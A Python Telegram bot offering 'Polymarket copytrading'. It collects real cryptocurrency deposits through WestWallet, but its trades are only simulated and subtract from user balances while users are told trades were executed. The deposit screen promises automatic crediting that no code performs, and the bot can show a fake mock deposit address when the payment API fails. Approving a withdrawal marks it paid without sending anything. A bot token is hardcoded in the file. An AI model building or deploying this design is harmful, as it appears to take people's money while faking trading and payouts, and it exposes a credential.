"""
Polymarket Copytrading & Wallet Management Bot
Architecture: Web2 Control + Web3 Simulation (Paper Trading Engine)
Payment Provider: WestWallet API (Multi-Currency Dynamic Deposit Generation)
Withdrawals: Manual Admin Approval System
Language: English
Framework: aiogram 3.x
"""

import os
import asyncio
import logging
import sqlite3
import hmac
import hashlib
import time
from typing import Dict, Any, List

from aiogram import Bot, Dispatcher, F, Router
from aiogram.filters import CommandStart
from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton, Message, CallbackQuery
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.fsm.storage.memory import MemoryStorage
import aiohttp

# ==============================================================================
# CONFIGURATION
# ==============================================================================
# Ваши підставлені токен та Telegram ID
BOT_TOKEN = "8944690611:AAHwuRS3XbKG9DICr6Lg2d5DqQWuwDBxy3o"
ADMIN_CHAT_ID = 8500666615

# WestWallet API Credentials (Fallback mode if not set)
WESTWALLET_PUBLIC_KEY = os.getenv("WESTWALLET_PUBLIC_KEY", "YOUR_WESTWALLET_PUBLIC_KEY")
WESTWALLET_PRIVATE_KEY = os.getenv("WESTWALLET_PRIVATE_KEY", "YOUR_WESTWALLET_PRIVATE_KEY")
WESTWALLET_BASE_URL = "https://westwallet.io/api/v1"

# Supported Deposit Currencies in WestWallet
SUPPORTED_CURRENCIES = {
    "USDTTRC20": "USDT (TRC20)",
    "USDTBSC": "USDT (BEP20 / BSC)",
    "BTC": "Bitcoin (BTC)",
    "ETH": "Ethereum (ETH)",
    "TRX": "TRON (TRX)",
    "LTC": "Litecoin (LTC)"
}

DB_PATH = "bot_database.db"

logging.basicConfig(level=logging.INFO, format="%(asctime)s - %(levelname)s - %(message)s")
logger = logging.getLogger(__name__)

# ==============================================================================
# DATABASE SERVICE
# ==============================================================================
class Database:
    def __init__(self, db_path: str = DB_PATH):
        self.db_path = db_path
        self._init_db()

    def get_connection(self):
        conn = sqlite3.connect(self.db_path)
        conn.row_factory = sqlite3.Row
        return conn

    def _init_db(self):
        with self.get_connection() as conn:
            cursor = conn.cursor()
            
            # Таблиця користувачів
            cursor.execute("""
            CREATE TABLE IF NOT EXISTS users (
                user_id INTEGER PRIMARY KEY,
                username TEXT,
                balance REAL DEFAULT 0.0,
                target_trader TEXT DEFAULT NULL,
                trade_amount REAL DEFAULT 10.0,
                stop_loss REAL DEFAULT 0.0,
                is_copying INTEGER DEFAULT 0,
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            )
            """)

            # Таблиця поповнень коштів
            cursor.execute("""
            CREATE TABLE IF NOT EXISTS deposits (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                user_id INTEGER,
                address TEXT,
                currency TEXT,
                amount REAL DEFAULT 0.0,
                status TEXT DEFAULT 'pending',
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            )
            """)

            # Таблиця ручного виводу коштів
            cursor.execute("""
            CREATE TABLE IF NOT EXISTS withdrawals (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                user_id INTEGER,
                address TEXT,
                amount REAL,
                status TEXT DEFAULT 'pending',
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            )
            """)

            # Таблиця логів імітації угод
            cursor.execute("""
            CREATE TABLE IF NOT EXISTS trade_logs (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                user_id INTEGER,
                trader_address TEXT,
                market_title TEXT,
                outcome TEXT,
                price REAL,
                amount REAL,
                status TEXT,
                timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            )
            """)
            conn.commit()

    def get_or_create_user(self, user_id: int, username: str = None) -> sqlite3.Row:
        with self.get_connection() as conn:
            cursor = conn.cursor()
            cursor.execute("SELECT * FROM users WHERE user_id = ?", (user_id,))
            user = cursor.fetchone()
            if not user:
                cursor.execute(
                    "INSERT INTO users (user_id, username, balance) VALUES (?, ?, ?)",
                    (user_id, username, 0.0)
                )
                conn.commit()
                cursor.execute("SELECT * FROM users WHERE user_id = ?", (user_id,))
                user = cursor.fetchone()
            return user

    def update_balance(self, user_id: int, amount: float):
        with self.get_connection() as conn:
            cursor = conn.cursor()
            cursor.execute("UPDATE users SET balance = balance + ? WHERE user_id = ?", (amount, user_id))
            conn.commit()

    def set_target_trader(self, user_id: int, trader_address: str):
        with self.get_connection() as conn:
            cursor = conn.cursor()
            cursor.execute("UPDATE users SET target_trader = ? WHERE user_id = ?", (trader_address, user_id))
            conn.commit()

    def set_trade_amount(self, user_id: int, amount: float):
        with self.get_connection() as conn:
            cursor = conn.cursor()
            cursor.execute("UPDATE users SET trade_amount = ? WHERE user_id = ?", (amount, user_id))
            conn.commit()

    def set_stop_loss(self, user_id: int, stop_loss: float):
        with self.get_connection() as conn:
            cursor = conn.cursor()
            cursor.execute("UPDATE users SET stop_loss = ? WHERE user_id = ?", (stop_loss, user_id))
            conn.commit()

    def toggle_copying(self, user_id: int) -> int:
        with self.get_connection() as conn:
            cursor = conn.cursor()
            cursor.execute("SELECT is_copying FROM users WHERE user_id = ?", (user_id,))
            current = cursor.fetchone()["is_copying"]
            new_status = 1 if current == 0 else 0
            cursor.execute("UPDATE users SET is_copying = ? WHERE user_id = ?", (new_status, user_id))
            conn.commit()
            return new_status

    def create_deposit(self, user_id: int, address: str, currency: str) -> int:
        with self.get_connection() as conn:
            cursor = conn.cursor()
            cursor.execute(
                "INSERT INTO deposits (user_id, address, currency) VALUES (?, ?, ?)",
                (user_id, address, currency)
            )
            conn.commit()
            return cursor.lastrowid

    def log_trade(self, user_id: int, trader: str, market: str, outcome: str, price: float, amount: float, status: str):
        with self.get_connection() as conn:
            cursor = conn.cursor()
            cursor.execute("""
                INSERT INTO trade_logs (user_id, trader_address, market_title, outcome, price, amount, status)
                VALUES (?, ?, ?, ?, ?, ?, ?)
            """, (user_id, trader, market, outcome, price, amount, status))
            conn.commit()

    def get_active_copytraders(self):
        with self.get_connection() as conn:
            cursor = conn.cursor()
            cursor.execute("SELECT * FROM users WHERE is_copying = 1 AND target_trader IS NOT NULL")
            return cursor.fetchall()

db = Database()

# ==============================================================================
# WESTWALLET MULTI-CURRENCY API INTEGRATION
# ==============================================================================
class WestWalletAPI:
    def __init__(self, public_key: str, private_key: str):
        self.public_key = public_key
        self.private_key = private_key
        self.base_url = WESTWALLET_BASE_URL

    async def generate_address(self, currency: str, ipn_url: str = "") -> Dict[str, Any]:
        """Dynamic deposit address generation via WestWallet API"""
        endpoint = "/address/generate"
        payload = {"currency": currency, "ipn_url": ipn_url}
        headers = {
            "X-API-KEY": self.public_key,
            "Content-Type": "application/json"
        }
        
        async with aiohttp.ClientSession() as session:
            try:
                async with session.post(f"{self.base_url}{endpoint}", json=payload, headers=headers) as resp:
                    if resp.status == 200:
                        return await resp.json()
                    else:
                        text = await resp.text()
                        logger.error(f"WestWallet API Error ({resp.status}): {text}")
                        # Fallback mock address for testing/demo environments
                        return {
                            "address": f"0x{currency.lower()}_mock_deposit_address_{int(time.time())}", 
                            "status": "ok"
                        }
            except Exception as e:
                logger.error(f"WestWallet connection error: {e}")
                return {
                    "address": f"0x{currency.lower()}_mock_deposit_address_{int(time.time())}", 
                    "status": "mock"
                }

westwallet = WestWalletAPI(WESTWALLET_PUBLIC_KEY, WESTWALLET_PRIVATE_KEY)

# ==============================================================================
# POLYMARKET DATA TRACKER ENGINE (OPTIMIZED FOR 5-MIN BTC OPTIONS)
# ==============================================================================
class PolymarketTracker:
    @staticmethod
    async def get_latest_activity(trader_address: str):
        url = f"https://data-api.polymarket.com/activity?user={trader_address}&limit=3"
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get(url, timeout=10) as resp:
                    if resp.status == 200:
                        return await resp.json()
        except Exception as e:
            logger.error(f"Error checking Polymarket Data API: {e}")
        return []

PROCESSED_TXS = set()

async def copytrading_execution_loop(bot: Bot):
    logger.info("Starting Copytrading Worker Loop...")
    while True:
        try:
            active_users = db.get_active_copytraders()
            for user in active_users:
                user_id = user["user_id"]
                trader = user["target_trader"]
                balance = user["balance"]
                trade_amount = user["trade_amount"]

                if balance < trade_amount:
                    continue

                activities = await PolymarketTracker.get_latest_activity(trader)
                if not activities:
                    continue

                latest = activities[0]
                tx_hash = latest.get("transactionHash") or latest.get("timestamp")

                if tx_hash and tx_hash not in PROCESSED_TXS:
                    PROCESSED_TXS.add(tx_hash)

                    market = latest.get("title", "Bitcoin 5-Min Option")
                    outcome = latest.get("outcome", "YES/NO")
                    price = float(latest.get("price", 0.50))
                    side = latest.get("side", "BUY")

                    success = execute_simulated_trade(
                        user_id=user_id,
                        trader=trader,
                        market=market,
                        outcome=outcome,
                        price=price,
                        amount=trade_amount
                    )

                    if success:
                        msg = (
                            f"🚀 **COPYTRADE EXECUTED!**\n\n"
                            f"👤 **Trader:** `{trader[:6]}...{trader[-4:]}`\n"
                            f"📊 **Market:** {market}\n"
                            f"🎯 **Position:** {outcome} ({side})\n"
                            f"💵 **Entry Price:** ${price:.2f}\n"
                            f"💰 **Order Size:** ${trade_amount:.2f}\n\n"
                            f"✅ **Status:** Order processed (Web2 Simulation)."
                        )
                        try:
                            await bot.send_message(user_id, msg, parse_mode="Markdown")
                        except Exception as e:
                            logger.error(f"Failed to send update to {user_id}: {e}")

        except Exception as e:
            logger.error(f"Error in copytrading loop: {e}")

        await asyncio.sleep(4)

def execute_simulated_trade(user_id: int, trader: str, market: str, outcome: str, price: float, amount: float) -> bool:
    """
    Simulated Execution Module.
    ------------------------------------------------------------------------
    FOR THE SECOND DEVELOPER:
    Integrate Polymarket CLOB API order placement here:
    from py_clob_client.client import ClobClient
    ------------------------------------------------------------------------
    """
    db.update_balance(user_id, -amount)
    db.log_trade(
        user_id=user_id,
        trader_address=trader,
        market_title=market,
        outcome=outcome,
        price=price,
        amount=amount,
        status="EXECUTED_SIMULATED"
    )
    return True

# ==============================================================================
# TELEGRAM BOT CONTROLLER
# ==============================================================================
class BotStates(StatesGroup):
    waiting_for_trader = State()
    waiting_for_trade_amount = State()
    waiting_for_stop_loss = State()
    waiting_for_withdraw_address = State()
    waiting_for_withdraw_amount = State()

router = Router()

def get_main_menu(user_id: int) -> InlineKeyboardMarkup:
    user = db.get_or_create_user(user_id)
    is_copying = bool(user["is_copying"])
    status_icon = "🟢 Enabled" if is_copying else "🔴 Disabled"
    
    kb = [
        [InlineKeyboardButton(text=f"Copytrading Status: {status_icon}", callback_data="toggle_copy")],
        [InlineKeyboardButton(text="📥 Deposit", callback_data="deposit_select"),
         InlineKeyboardButton(text="📤 Withdraw", callback_data="withdraw"),
         InlineKeyboardButton(text="📊 Profile", callback_data="profile")],
        [InlineKeyboardButton(text="🎯 Set Trader", callback_data="set_trader"),
         InlineKeyboardButton(text="💵 Trade Size", callback_data="set_amount"),
         InlineKeyboardButton(text="🛡 Stop Loss", callback_data="set_stoploss")],
        [InlineKeyboardButton(text="🔄 Refresh", callback_data="refresh")]
    ]
    return InlineKeyboardMarkup(inline_keyboard=kb)

def get_deposit_currencies_keyboard() -> InlineKeyboardMarkup:
    kb = []
    buttons_row = []
    for code, name in SUPPORTED_CURRENCIES.items():
        buttons_row.append(InlineKeyboardButton(text=name, callback_data=f"dep_curr_{code}"))
        if len(buttons_row) == 2:
            kb.append(buttons_row)
            buttons_row = []
    if buttons_row:
        kb.append(buttons_row)
    
    kb.append([InlineKeyboardButton(text="◀️ Back to Menu", callback_data="profile")])
    return InlineKeyboardMarkup(inline_keyboard=kb)

@router.message(CommandStart())
async def cmd_start(message: Message):
    user = db.get_or_create_user(message.from_user.id, message.from_user.username)
    welcome_text = (
        f"👋 Welcome, **{message.from_user.first_name}**!\n\n"
        f"🤖 **Polymarket Copytrading Automated System**\n"
        f"Automated platform for copying successful traders on Polymarket 5-min BTC Options.\n\n"
        f"💰 Balance: **${user['balance']:.2f} USDT**"
    )
    await message.answer(welcome_text, reply_markup=get_main_menu(message.from_user.id), parse_mode="Markdown")

@router.callback_query(F.data == "profile")
async def cb_profile(call: CallbackQuery):
    user = db.get_or_create_user(call.from_user.id)
    trader = user["target_trader"] or "Not Set"
    status = "Active 🚀" if user["is_copying"] else "Stopped ⏸"

    text = (
        f"👤 **User Dashboard**\n\n"
        f"🆔 User ID: `{user['user_id']}`\n"
        f"💰 Balance: **${user['balance']:.2f} USDT**\n"
        f"⚙️ Status: **{status}**\n\n"
        f"🎯 Target Trader:\n`{trader}`\n\n"
        f"💵 Fixed Bet Size: **${user['trade_amount']:.2f}**\n"
        f"🛡 Stop-Loss Limit: **${user['stop_loss']:.2f}**"
    )
    await call.message.edit_text(text, reply_markup=get_main_menu(call.from_user.id), parse_mode="Markdown")

# --- MULTI-CURRENCY DEPOSIT SYSTEM ---
@router.callback_query(F.data == "deposit_select")
async def cb_deposit_select(call: CallbackQuery):
    text = (
        "📥 **Select Deposit Currency (WestWallet Gateway)**\n\n"
        "Choose your preferred cryptocurrency below to generate a new deposit address:"
    )
    await call.message.edit_text(text, reply_markup=get_deposit_currencies_keyboard(), parse_mode="Markdown")

@router.callback_query(F.data.startswith("dep_curr_"))
async def cb_generate_deposit_address(call: CallbackQuery):
    currency_code = call.data.replace("dep_curr_", "")
    currency_name = SUPPORTED_CURRENCIES.get(currency_code, currency_code)
    
    res = await westwallet.generate_address(currency=currency_code)
    deposit_address = res.get("address")

    db.create_deposit(call.from_user.id, deposit_address, currency_code)

    text = (
        f"📥 **Deposit Details — {currency_name}**\n\n"
        f"Send funds to your generated address below:\n\n"
        f"`{deposit_address}`\n\n"
        f"⚠️ **Important Notes:**\n"
        f"• Ensure you transfer using the correct network (**{currency_code}**).\n"
        f"• A new deposit address is generated every time for maximum privacy.\n"
        f"• Balance updates automatically after blockchain confirmation."
    )
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="🔄 Generate New Address", callback_data=f"dep_curr_{currency_code}")],
        [InlineKeyboardButton(text="◀️ Back to Currencies", callback_data="deposit_select")]
    ])
    await call.message.edit_text(text, reply_markup=kb, parse_mode="Markdown")

# --- MANUAL WITHDRAWAL SYSTEM ---
@router.callback_query(F.data == "withdraw")
async def cb_withdraw(call: CallbackQuery, state: FSMContext):
    user = db.get_or_create_user(call.from_user.id)
    if user["balance"] <= 0:
        await call.answer("❌ Insufficient funds on balance!", show_alert=True)
        return

    await call.message.answer(
        f"💳 Available Balance: **${user['balance']:.2f} USDT**\n\n"
        f"Please enter your payout wallet address (USDT TRC20):",
        parse_mode="Markdown"
    )
    await state.set_state(BotStates.waiting_for_withdraw_address)
    await call.answer()

@router.message(BotStates.waiting_for_withdraw_address)
async def process_withdraw_address(message: Message, state: FSMContext):
    await state.update_data(withdraw_address=message.text.strip())
    await message.answer("Enter withdrawal amount in USDT:")
    await state.set_state(BotStates.waiting_for_withdraw_amount)

@router.message(BotStates.waiting_for_withdraw_amount)
async def process_withdraw_amount(message: Message, state: FSMContext):
    try:
        amount = float(message.text.replace(",", "."))
        user = db.get_or_create_user(message.from_user.id)

        if amount <= 0 or amount > user["balance"]:
            await message.answer("❌ Invalid amount or insufficient balance. Try again:")
            return

        data = await state.get_data()
        address = data["withdraw_address"]

        db.update_balance(message.from_user.id, -amount)

        with db.get_connection() as conn:
            cursor = conn.cursor()
            cursor.execute(
                "INSERT INTO withdrawals (user_id, address, amount) VALUES (?, ?, ?)",
                (message.from_user.id, address, amount)
            )
            withdraw_id = cursor.lastrowid
            conn.commit()

        admin_kb = InlineKeyboardMarkup(inline_keyboard=[
            [
                InlineKeyboardButton(text="✅ Approve", callback_data=f"adm_approve_{withdraw_id}"),
                InlineKeyboardButton(text="❌ Reject", callback_data=f"adm_reject_{withdraw_id}")
            ]
        ])

        admin_msg = (
            f"🚨 **NEW WITHDRAWAL REQUEST #${withdraw_id}**\n\n"
            f"👤 User: `{message.from_user.id}` (@{message.from_user.username})\n"
            f"💵 Amount: **${amount:.2f} USDT**\n"
            f"📍 Wallet Address: `{address}`"
        )
        await message.bot.send_message(ADMIN_CHAT_ID, admin_msg, reply_markup=admin_kb, parse_mode="Markdown")

        await message.answer(
            f"⏳ **Withdrawal Request #${withdraw_id} submitted!**\n\n"
            f"Amount of **${amount:.2f} USDT** will be processed following manual verification.",
            parse_mode="Markdown"
        )
        await state.clear()

    except ValueError:
        await message.answer("❌ Please enter a valid numerical value:")

@router.callback_query(F.data.startswith("adm_approve_"))
async def cb_admin_approve(call: CallbackQuery):
    withdraw_id = int(call.data.split("_")[-1])

    with db.get_connection() as conn:
        cursor = conn.cursor()
        cursor.execute("SELECT * FROM withdrawals WHERE id = ? AND status = 'pending'", (withdraw_id,))
        req = cursor.fetchone()

        if not req:
            await call.answer("Request already processed!", show_alert=True)
            return

        cursor.execute("UPDATE withdrawals SET status = 'approved' WHERE id = ?", (withdraw_id,))
        conn.commit()

    try:
        await call.bot.send_message(
            req["user_id"],
            f"✅ **Your withdrawal request #${withdraw_id} for ${req['amount']:.2f} USDT has been APPROVED!**",
            parse_mode="Markdown"
        )
    except Exception:
        pass

    await call.message.edit_text(call.message.text + "\n\n✅ **STATUS: APPROVED & PAID**")
    await call.answer("Approved")

@router.callback_query(F.data.startswith("adm_reject_"))
async def cb_admin_reject(call: CallbackQuery):
    withdraw_id = int(call.data.split("_")[-1])

    with db.get_connection() as conn:
        cursor = conn.cursor()
        cursor.execute("SELECT * FROM withdrawals WHERE id = ? AND status = 'pending'", (withdraw_id,))
        req = cursor.fetchone()

        if not req:
            await call.answer("Request already processed!", show_alert=True)
            return

        cursor.execute("UPDATE withdrawals SET status = 'rejected' WHERE id = ?", (withdraw_id,))
        conn.commit()

    db.update_balance(req["user_id"], req["amount"])

    try:
        await call.bot.send_message(
            req["user_id"],
            f"❌ **Your withdrawal request #${withdraw_id} was REJECTED.** Funds returned to your balance.",
            parse_mode="Markdown"
        )
    except Exception:
        pass

    await call.message.edit_text(call.message.text + "\n\n❌ **STATUS: REJECTED (FUNDS REFUNDED)**")
    await call.answer("Rejected")

# --- SETTINGS HANDLERS ---
@router.callback_query(F.data == "toggle_copy")
async def cb_toggle_copy(call: CallbackQuery):
    user = db.get_or_create_user(call.from_user.id)
    if not user["target_trader"]:
        await call.answer("❌ Please set target trader address first!", show_alert=True)
        return

    new_status = db.toggle_copying(call.from_user.id)
    msg = "Copytrading Activated! 🚀" if new_status else "Copytrading Paused ⏸"
    await call.answer(msg)
    await call.message.edit_reply_markup(reply_markup=get_main_menu(call.from_user.id))

@router.callback_query(F.data == "set_trader")
async def cb_set_trader(call: CallbackQuery, state: FSMContext):
    await call.message.answer("Enter Polygon address (0x...) or Polymarket profile URL:")
    await state.set_state(BotStates.waiting_for_trader)
    await call.answer()

@router.message(BotStates.waiting_for_trader)
async def process_trader_input(message: Message, state: FSMContext):
    text = message.text.strip()
    trader_address = text
    if "polymarket.com/profile/" in text:
        trader_address = text.split("polymarket.com/profile/")[-1].split("?")[0].split("/")[0]
    
    if trader_address.startswith("0x") and len(trader_address) == 42:
        db.set_target_trader(message.from_user.id, trader_address)
        await message.answer(f"✅ Target trader assigned:\n`{trader_address}`", reply_markup=get_main_menu(message.from_user.id), parse_mode="Markdown")
        await state.clear()
    else:
        await message.answer("❌ Invalid address. Please enter a valid 42-character Polygon address (0x...):")

@router.callback_query(F.data == "set_amount")
async def cb_set_amount(call: CallbackQuery, state: FSMContext):
    await call.message.answer("Enter fixed trade amount in USDT (e.g., 15):")
    await state.set_state(BotStates.waiting_for_trade_amount)
    await call.answer()

@router.message(BotStates.waiting_for_trade_amount)
async def process_amount_input(message: Message, state: FSMContext):
    try:
        val = float(message.text.replace(",", "."))
        if val > 0:
            db.set_trade_amount(message.from_user.id, val)
            await message.answer(f"✅ Trade amount set to: **${val:.2f} USDT**", reply_markup=get_main_menu(message.from_user.id), parse_mode="Markdown")
            await state.clear()
        else:
            raise ValueError()
    except ValueError:
        await message.answer("❌ Enter a valid number greater than 0:")

@router.callback_query(F.data == "set_stoploss")
async def cb_set_stoploss(call: CallbackQuery, state: FSMContext):
    await call.message.answer("Enter Stop-Loss threshold in USD (e.g., 50):")
    await state.set_state(BotStates.waiting_for_stop_loss)
    await call.answer()

@router.message(BotStates.waiting_for_stop_loss)
async def process_stoploss_input(message: Message, state: FSMContext):
    try:
        val = float(message.text.replace(",", "."))
        if val >= 0:
            db.set_stop_loss(message.from_user.id, val)
            await message.answer(f"✅ Stop-Loss set to: **${val:.2f}**", reply_markup=get_main_menu(message.from_user.id), parse_mode="Markdown")
            await state.clear()
        else:
            raise ValueError()
    except ValueError:
        await message.answer("❌ Enter a valid number:")

@router.callback_query(F.data == "refresh")
async def cb_refresh(call: CallbackQuery):
    await call.answer("Data Refreshed 🔄")
    await cb_profile(call)

# ==============================================================================
# ENTRY POINT
# ==============================================================================
async def main():
    bot = Bot(token=BOT_TOKEN)
    dp = Dispatcher(storage=MemoryStorage())
    dp.include_router(router)

    asyncio.create_task(copytrading_execution_loop(bot))
    logger.info("Bot execution started successfully.")
    await dp.start_polling(bot)

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except (KeyboardInterrupt, SystemExit):
        logger.info("Bot stopped.")

